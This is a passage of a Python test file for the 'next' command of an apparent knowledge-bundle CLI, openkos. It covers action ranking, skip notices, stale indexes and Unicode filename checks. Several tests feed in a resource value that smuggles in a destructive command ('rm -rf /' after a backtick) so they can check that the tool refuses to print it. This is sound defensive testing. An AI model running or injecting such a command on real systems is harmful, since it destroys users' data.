    seed_vectors_db: Callable[[Path], None],
) -> None:
    """No model backend is constructed on any workspace state, including
    the no-action path (spec: No Model Backend Constructed)."""
    _init_workspace(tmp_path, monkeypatch)
    monkeypatch.setattr("openkos.cli.main.OllamaClient", _RaisingOllamaClient)
    seed_vectors_db(tmp_path)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0


def test_no_runnable_action_names_status_on_a_truly_empty_bundle(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """A freshly initialized workspace with a populated vector index and no
    findings prints a line naming `openkos status`, and no wording claims
    the bundle is clean (spec: No-Runnable-Action Output Never Claims
    Cleanliness, "No ranked tier fires on a truly empty bundle")."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "openkos status" in result.stdout
    assert "clean" not in result.stdout.lower()
    assert "nothing needs attention" not in result.stdout.lower()
    assert "issue-free" not in result.stdout.lower()


def test_no_runnable_action_same_output_despite_commandless_findings(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """The same no-runnable-action line appears even when commandless
    findings (a §9 conformance violation) exist in the bundle, because
    `next`'s short-circuit means it never proves their absence (spec:
    No-Runnable-Action Output Never Claims Cleanliness, "No ranked tier
    fires despite commandless findings existing")."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    concepts_dir = tmp_path / "bundle" / "concepts"
    concepts_dir.mkdir(parents=True, exist_ok=True)
    (concepts_dir / "orphan.md").write_text(
        "---\ntitle: no type here\n---\nBody.\n", encoding="utf-8"
    )

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "openkos status" in result.stdout
    assert "clean" not in result.stdout.lower()


def test_no_count_of_unseen_findings_when_a_tier_fires(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """When a ranked tier fires, no numeral describes how many other
    findings exist or remain unseen (spec: No Count of Unseen Findings,
    "No count appears when a tier fires"). One eligible document keeps the
    #386 bootstrap rung out of the way so tier 1 is the one that fires."""
    _init_workspace(tmp_path, monkeypatch)
    _write_doc(tmp_path / "bundle" / "concepts" / "alpha.md", title="Alpha")

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "openkos reindex" in result.stdout
    # No mask: the tier-1 output carries no numeral of its own, so any digit
    # at all would be a count of findings `next` never looked at. Masking a
    # bare "1" here would let the very regression this pins ("1 other item
    # pending") through untouched.
    assert not any(char.isdigit() for char in result.stdout)


def test_no_count_of_unseen_findings_when_tier_4_has_paid_every_walk(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """Reaching tier 4 (which has already paid for every walk) still prints
    no numeral describing how many commandless or unranked findings exist,
    even though a commandless finding is present in the bundle alongside a
    duplicate group (spec: No Count of Unseen Findings, "No count appears
    when tier 4 has already paid every walk"). Tier 4's own group count IS
    allowed -- it describes the finding that fired, not findings `next`
    skipped."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")
    (tmp_path / "bundle" / "concepts" / "orphan.md").write_text(
        "---\ntitle: no type here\n---\nBody.\n", encoding="utf-8"
    )

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "openkos duplicates" in result.stdout
    assert "1 candidate group" in result.stdout
    stripped = result.stdout.replace("1 candidate group", "")
    assert not any(char.isdigit() for char in stripped)


# --- #274: a `resource` backtick must never truncate the printed path -----


def test_backtick_in_resource_never_becomes_a_truncated_printed_path(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """A Source's `resource` is interpolated verbatim INSIDE the retry
    hint's backtick span (`lint.py:630`), so a `resource` carrying a
    backtick of its own closes that span early. The truncated remainder is
    a well-formed `openkos ingest <plain path>` naming a DIFFERENT file
    than the finding is about, which is the one thing tier 2 must never
    print (issue #274). Declining hands the run to tier 4."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_unextracted_source(tmp_path, resource="raw/notes.txt`; rm -rf /")
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos ingest" not in result.stdout
    assert "rm -rf" not in result.stdout
    assert "Run: openkos curate" in result.stdout


def test_balanced_backticks_in_resource_are_declined_too(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """The truncation is not detectable by counting backticks. A `resource`
    carrying TWO of them leaves the detail's total count EVEN and still
    yields a well-formed, wrong `openkos ingest raw/a` span. Tier 2 must
    therefore corroborate the extracted argument against the document's own
    `resource`, not against the span's shape (issue #274)."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_unextracted_source(tmp_path, resource="raw/a`x`b.txt")
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos ingest" not in result.stdout
    assert "Run: openkos curate" in result.stdout


def test_an_intact_resource_still_fires_tier_2_verbatim(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """The corroboration closing #274 must not cost tier 2 its normal
    behaviour: an ordinary `resource` still produces the finding's own
    retry command, character for character."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_unextracted_source(tmp_path, resource="raw/notes.txt")

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos ingest raw/notes.txt" in result.stdout


# --- #275: a bundle that could not be fully read is never silent ----------


def _write_unparseable_doc(tmp_path: Path, name: str = "broken") -> None:
    """A file with no frontmatter block at all -- `collect_docs` excludes it
    from `docs` and reports it ONLY as a skip notice (`lint.py:176`)."""
    concepts_dir = tmp_path / "bundle" / "concepts"
    concepts_dir.mkdir(parents=True, exist_ok=True)
    (concepts_dir / f"{name}.md").write_text(
        "Just plain text, no frontmatter block.\n", encoding="utf-8"
    )


def test_skip_notices_are_named_on_the_no_action_path(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """A document excluded from `docs` exists ONLY as a skip notice, so a
    run that discards the notices reports "no ranked action" over a bundle
    it could not fully read -- a partial scan reading as a clean one, which
    `collect_docs` documents as the exact failure it exists to prevent
    (issue #275)."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_unparseable_doc(tmp_path)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "No ranked action found in this bundle." in result.stdout
    assert "concepts/broken.md: skipped (unparseable frontmatter)" in result.stdout
    assert "openkos status" in result.stdout


def test_skip_notices_are_named_even_when_a_tier_fires(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """A damaged bundle can also produce a ranked action, and that action is
    then derived from a document set that is knowingly incomplete. The
    notices are emitted on that path too, exactly as `_STATUS_POINTER` is
    (D4: the honesty guard holds on every path)."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_unextracted_source(tmp_path, resource="raw/notes.txt")
    _write_unparseable_doc(tmp_path)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos ingest raw/notes.txt" in result.stdout
    assert "concepts/broken.md: skipped (unparseable frontmatter)" in result.stdout


def test_every_skipped_document_is_named_not_just_the_first(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """Each skipped document names a separate file to go and look at, so a
    count alone -- or the first one only -- would leave the rest invisible."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_unparseable_doc(tmp_path, name="broken-a")
    _write_unparseable_doc(tmp_path, name="broken-b")

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "concepts/broken-a.md: skipped (unparseable frontmatter)" in result.stdout
    assert "concepts/broken-b.md: skipped (unparseable frontmatter)" in result.stdout


def test_tier_1_names_skip_notices_its_bootstrap_gate_walk_observed(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """`next` reports only what it actually observed -- and since #386 the
    bootstrap gate pays the docs walk before tier 1 may fire, so the skip
    notices that walk observed ARE reported alongside the `reindex`
    recommendation (D4: the honesty guard holds on every path). Exactly one
    walk, never a second."""
    _init_workspace(tmp_path, monkeypatch)
    _write_doc(tmp_path / "bundle" / "concepts" / "alpha.md", title="Alpha")
    _write_unparseable_doc(tmp_path)
    calls = 0
    real_collect_docs = lint_check.collect_docs

    def counting_collect_docs(bundle_dir: Path) -> object:
        nonlocal calls
        calls += 1
        return real_collect_docs(bundle_dir)

    monkeypatch.setattr(lint_check, "collect_docs", counting_collect_docs)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos reindex" in result.stdout
    assert calls == 1
    assert "concepts/broken.md: skipped (unparseable frontmatter)" in result.stdout


# --- #276: a declined tier-2 finding is named, never silently dropped -----


def test_failed_extraction_with_no_resource_is_named_not_dropped(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """`check_unextracted` emits a genuine, actionable finding for a Source
    with `extraction_status: failed` and no `resource` -- only its embedded
    command is the bare, non-runnable `openkos ingest` (`lint.py:632`).
    Declining to print that command is right; declining SILENTLY is not,
    because a real failed ingest then leaves no trace at all (issue #276)."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_unextracted_source(tmp_path, resource="")

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos ingest" not in result.stdout
    assert "sources/notes" in result.stdout
    assert "records no resource" in result.stdout
    assert "openkos status" in result.stdout


def test_declination_says_why_a_present_resource_was_unusable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """A missing `resource` and an unusable one point at DIFFERENT repairs
    -- record the path, versus rename the file -- so the two declinations
    must not collapse into one indistinguishable sentence."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_unextracted_source(tmp_path, resource="raw/notes.txt`; rm -rf /")

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos ingest" not in result.stdout
    assert "sources/notes" in result.stdout
    assert "records no resource" not in result.stdout
    assert "not a runnable argument" in result.stdout


def test_declination_is_named_even_when_a_lower_tier_fires(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """A lower tier firing does not make the skipped finding go away. The
    declination is emitted alongside the recommendation, the same way #275's
    skip notices are (D4: the honesty guard holds on every path)."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_unextracted_source(tmp_path, resource="")
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-a.md", title="Stoicism")
    _write_doc(tmp_path / "bundle" / "concepts" / "dup-b.md", title="STOICISM")

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos curate" in result.stdout
    assert "sources/notes" in result.stdout


def test_declination_never_reprints_the_raw_unusable_resource(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """The declination names the DOCUMENT, never the value that made it
    undecidable. Echoing the raw `resource` back would put the very string
    tier 2 refused to trust onto the line below `Run:` (#274's defect, one
    step removed)."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_unextracted_source(tmp_path, resource="raw/notes.txt`; rm -rf /")

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "rm -rf" not in result.stdout
    assert "sources/notes" in result.stdout


def test_a_runnable_finding_produces_no_declination(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """Naming declinations must not turn every ordinary tier-2 run into a
    two-part message: an intact finding fires and says nothing else."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_unextracted_source(tmp_path, resource="raw/notes.txt")

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos ingest raw/notes.txt" in result.stdout
    assert "could not be turned into" not in result.stdout


def test_tier_1_reports_no_declination_even_though_the_gate_walk_was_paid(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A declination is a TIER-2 observation, and tier 1 firing means tier 2
    never evaluated its findings -- so no declination appears even though
    the #386 bootstrap gate already paid the docs walk. Reporting one would
    claim an evaluation that never happened."""
    _init_workspace(tmp_path, monkeypatch)
    _write_unextracted_source(tmp_path, resource="")
    calls = 0
    real_collect_docs = lint_check.collect_docs

    def counting_collect_docs(bundle_dir: Path) -> object:
        nonlocal calls
        calls += 1
        return real_collect_docs(bundle_dir)

    monkeypatch.setattr(lint_check, "collect_docs", counting_collect_docs)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos reindex" in result.stdout
    assert calls == 1
    assert "sources/notes" not in result.stdout


# --- stale derived indexes (#381) ---------------------------------------


def _write_stale_indexes(tmp_path: Path) -> None:
    """Write both manifest-gated stores, then edit the bundle underneath
    them -- the state every curation verb leaves, none of which reindex."""
    bundle_dir = tmp_path / "bundle"
    fts.write_fts_index(tmp_path / ".openkos" / "fts.db", bundle_dir)
    sqlite_graph.write_graph_store(tmp_path / ".openkos" / "graph.db", bundle_dir)
    concepts = bundle_dir / "concepts"
    concepts.mkdir(parents=True, exist_ok=True)
    (concepts / "new.md").write_text(
        "---\ntype: Concept\ntitle: New\ndescription: ''\n---\nbody\n",
        encoding="utf-8",
    )


def test_next_recommends_reindex_when_the_derived_indexes_are_stale(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """#381: `next` exists to answer "what should I do now", and after a
    curation session the honest answer is `reindex` -- otherwise every later
    retrieval silently answers from an older bundle."""
    _init_workspace(tmp_path, monkeypatch)
    vectorstore.open_vector_store(tmp_path / ".openkos" / "vectors.db").close()
    _write_stale_indexes(tmp_path)
    monkeypatch.setattr(
        "openkos.cli.next_action.vector_store_is_empty", lambda _path: False
    )

    result = next_action.next_action(config.WorkspaceLayout(tmp_path))

    assert result.action is not None
    assert result.action.command == "openkos reindex"
    assert "older than the bundle" in result.action.reason
    assert "fts, graph" in result.action.reason


def test_next_prefers_the_missing_vector_index_over_staleness(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Both tiers recommend the same command, so only the REASON can differ.
    Missing outranks stale: an absent index blocks retrieval outright, while
    a stale one merely degrades it, and the user should be told the worse
    of the two."""
    _init_workspace(tmp_path, monkeypatch)
    _write_stale_indexes(tmp_path)
    monkeypatch.setattr(
        "openkos.cli.next_action.vector_store_is_empty", lambda _path: True
    )

    result = next_action.next_action(config.WorkspaceLayout(tmp_path))

    assert result.action is not None
    assert result.action.command == "openkos reindex"
    assert "missing or empty" in result.action.reason
    assert "older than the bundle" not in result.action.reason


def test_next_does_not_recommend_reindex_for_staleness_on_a_fresh_workspace(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """#386 guard: `init` writes no derived store, and absence is not
    staleness. This tier must not become a second source of the very defect
    #386 reports -- recommending `reindex` over an empty workspace."""
    _init_workspace(tmp_path, monkeypatch)
    monkeypatch.setattr(
        "openkos.cli.next_action.vector_store_is_empty", lambda _path: False
    )

    result = next_action.next_action(config.WorkspaceLayout(tmp_path))

    assert result.action is None or "older than the bundle" not in result.action.reason


def test_next_stays_silent_about_staleness_when_the_indexes_are_fresh(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Indexes written over the bundle they describe are fresh, and a fresh
    pair must produce no recommendation of its own."""
    _init_workspace(tmp_path, monkeypatch)
    bundle_dir = tmp_path / "bundle"
    fts.write_fts_index(tmp_path / ".openkos" / "fts.db", bundle_dir)
    sqlite_graph.write_graph_store(tmp_path / ".openkos" / "graph.db", bundle_dir)
    monkeypatch.setattr(
        "openkos.cli.next_action.vector_store_is_empty", lambda _path: False
    )

    result = next_action.next_action(config.WorkspaceLayout(tmp_path))

    assert result.action is None or "older than the bundle" not in result.action.reason


def _break_os_walk(monkeypatch: pytest.MonkeyPatch) -> None:
    """Force `okf._walk_errors` to report exactly one directory-scan error,
    deterministically -- mirrors the same helper in
    `tests/unit/cli/test_contradictions.py`, without relying on real
    `chmod` bits (which root and some CI filesystems ignore)."""
    import os

    original_walk = os.walk
    walk_error = OSError(13, "Permission denied", "locked")

    def fake_walk(
        top: "str | os.PathLike[str]",
        topdown: bool = True,
        onerror: "Callable[[OSError], object] | None" = None,
        followlinks: bool = False,
    ) -> "object":
        if onerror is not None:
            onerror(walk_error)
        yield from original_walk(top, topdown, onerror, followlinks)

    monkeypatch.setattr(os, "walk", fake_walk)


def test_bootstrap_does_not_claim_empty_when_the_walk_is_incomplete(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A bundle that merely LOOKS empty because a subdirectory could not be
    listed is never told to ingest its first source (#486).

    The bootstrap tier gates on `signals.docs`, populated by a walk that
    silently drops any subdirectory it cannot list. `status` folds those
    walk errors into its "Needs attention" section; `next` had no such
    pass, so a bundle whose documents all live under an unreadable subtree
    read as EMPTY and got "ingest your first source" -- with no hint that a
    populated bundle exists and could not be scanned."""
    _init_workspace(tmp_path, monkeypatch)
    _break_os_walk(monkeypatch)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "first source" not in result.stdout
    assert "Run: openkos ingest" not in result.stdout
    # Names the real condition and points at the verb that shows WHICH
    # directory is unreadable.
    assert "Run: openkos status" in result.stdout
    assert "could not be read" in result.stdout


def test_bootstrap_still_recommends_ingest_on_a_genuinely_empty_bundle(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The incomplete-walk guard must not swallow the ordinary bootstrap
    case (#486): with a readable, genuinely empty bundle the first-ingest
    recommendation is still exactly what #386 established."""
    _init_workspace(tmp_path, monkeypatch)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "Run: openkos ingest" in result.stdout
    assert "first source" in result.stdout
    assert "could not be read" not in result.stdout


def test_incomplete_walk_redirect_still_names_the_file_level_skips(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Both kinds of damage in one run: unparseable FILES and an unlistable
    DIRECTORY (#486).

    The two travel different paths -- skip notices come from
    `collect_docs`'s per-file errors, the redirect comes from
    `okf._walk_errors`'s directory-scan errors -- and the redirect must not
    swallow the notices on its way past.

    `render_lines` appends the notices after BOTH branches, so today they
    survive by construction rather than by this test's vigilance. That is
    the point: this pins the D4 honesty guard against the ONE new way it
    could be lost -- a future redirect that returns early or renders itself
    -- and it is the only test where a file-level skip and a
    directory-level failure occur in the same run."""
    _init_workspace(tmp_path, monkeypatch)
    _write_unparseable_doc(tmp_path)
    _break_os_walk(monkeypatch)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    # The redirect fires: an unlistable directory means "empty" is not a
    # claim this run can make, even though a file-level skip explains part
    # of the emptiness.
    assert "Run: openkos status" in result.stdout
    assert "could not be read" in result.stdout
    assert "Run: openkos ingest" not in result.stdout
    # ...and the file-level damage is still named, not shadowed by it.
    assert "concepts/broken.md: skipped (unparseable frontmatter)" in result.stdout


# --- #491: `next` recommends `normalize-names` for non-NFC on-disk names ----

NFD_CAFE = unicodedata.normalize("NFD", "café")
"""Built with an explicit NFD normalize, never a literal: a source file is
saved NFC by most editors, so a pasted 'café' would silently stop being a
decomposed name and the test would assert nothing (mirrors
`test_lint_non_nfc.py`'s own convention)."""


def _spy_non_nfc(monkeypatch: pytest.MonkeyPatch) -> dict[str, int]:
    """Count `scan_non_nfc_entries` calls through the name `next_action`
    actually resolves, mirroring `_spy_walks`."""
    calls = {"n": 0}
    real = lint_check.scan_non_nfc_entries

    def _counting(bundle_dir: Path) -> list[lint_check.NonNfcEntry]:
        calls["n"] += 1
        return real(bundle_dir)

    monkeypatch.setattr(
        "openkos.cli.next_action.lint_check.scan_non_nfc_entries", _counting
    )
    return calls


def test_non_nfc_tier_is_ranked_last() -> None:
    """The non-NFC tier sits AFTER the duplicate-groups tier.

    Placement is the whole cost argument (#491). Its walk is only reached
    on a run where every ranked tier above it found nothing -- exactly the
    justification `walk_incomplete` already uses for its own extra
    traversal ("no other tier's budget moves"). Ranked last also matches
    the module's ordering principle: a decomposed filename blocks nothing,
    is not missing, and is not unsafe -- it is hygiene, which outranks
    nothing."""
    assert next_action._TIERS[-1] is next_action._tier_non_nfc_names
    assert (
        next_action._TIERS.index(next_action._tier_duplicate_groups)
        == len(next_action._TIERS) - 2
    )


def test_non_nfc_scan_is_memoized_when_read_twice(tmp_path: Path) -> None:
    """Reading the property twice pays exactly one walk, matching every
    other signal on `_BundleSignals`."""
    _init_workspace_dirs = tmp_path / "bundle"
    _init_workspace_dirs.mkdir(parents=True, exist_ok=True)
    signals = next_action._BundleSignals(config.WorkspaceLayout(tmp_path))
    calls = {"n": 0}
    real = lint_check.scan_non_nfc_entries

    def _counting(bundle_dir: Path) -> list[lint_check.NonNfcEntry]:
        calls["n"] += 1
        return real(bundle_dir)

    with pytest.MonkeyPatch.context() as mp:
        mp.setattr("openkos.cli.next_action.lint_check.scan_non_nfc_entries", _counting)
        first = signals.non_nfc_entries
        second = signals.non_nfc_entries

    assert calls["n"] == 1
    # Same object, not merely equal: the second read must return the
    # memoized list rather than a fresh one that happens to match.
    assert first is second


def test_an_earlier_tier_never_pays_the_non_nfc_walk(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """A run that stops at an earlier tier NEVER opens the non-NFC walk.

    This is the cost property #491 exists to protect, and it is what makes
    the extra traversal defensible without any persistent cache: the walk
    is not merely memoized, it is never reached at all unless every ranked
    tier above it came up empty."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    _write_unextracted_source(tmp_path)
    (tmp_path / "bundle" / "concepts").mkdir(parents=True, exist_ok=True)
    (tmp_path / "bundle" / "concepts" / f"{NFD_CAFE}.md").write_text(
        "---\ntype: Concept\ntitle: Cafe\n---\nBody.\n", encoding="utf-8"
    )
    _spy_walks(monkeypatch)
    non_nfc_calls = _spy_non_nfc(monkeypatch)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "openkos ingest raw/notes.txt" in result.stdout
    assert non_nfc_calls["n"] == 0


def test_clean_bundle_with_a_non_nfc_name_recommends_normalize_names(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """With every ranked tier clean, a decomposed on-disk name is what
    `next` recommends acting on."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    concepts = tmp_path / "bundle" / "concepts"
    concepts.mkdir(parents=True, exist_ok=True)
    (concepts / f"{NFD_CAFE}.md").write_text(
        "---\ntype: Concept\ntitle: Cafe\n---\nBody.\n", encoding="utf-8"
    )
    _spy_walks(monkeypatch)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "openkos normalize-names" in result.stdout


def test_clean_bundle_without_non_nfc_names_recommends_nothing(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
    seed_vectors_db: Callable[[Path], None],
) -> None:
    """An all-NFC bundle with every tier clean produces no action -- the
    new tier must not manufacture one."""
    _init_workspace(tmp_path, monkeypatch)
    seed_vectors_db(tmp_path)
    concepts = tmp_path / "bundle" / "concepts"
    concepts.mkdir(parents=True, exist_ok=True)
    (concepts / "cafe.md").write_text(
        "---\ntype: Concept\ntitle: Cafe\n---\nBody.\n", encoding="utf-8"
    )
    _spy_walks(monkeypatch)

    result = runner.invoke(app, ["next"])

    assert result.exit_code == 0
    assert "openkos normalize-names" not in result.stdout
